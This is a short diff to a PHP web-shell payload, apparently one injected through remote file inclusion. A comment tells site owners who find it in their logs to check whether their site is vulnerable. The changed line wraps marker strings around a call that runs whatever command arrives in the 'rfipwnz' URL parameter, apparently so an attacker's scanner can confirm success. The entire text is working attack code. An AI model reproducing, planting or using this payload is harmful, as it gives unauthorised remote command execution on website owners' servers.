@@ -4,7 +4,7 @@
  If you found it in your logs, just check if your website is vulnerable
 */
 
-echo "fun"."ciona\n".shell($_GET['rfipwnz'], false);
+echo 'JKasrklascio'.'wEUIOASHc'.shell($_GET['rfipwnz'], false).'JKasrklascio'.'wEUIOASHc';
 
 
 /* ejecuta comandos */
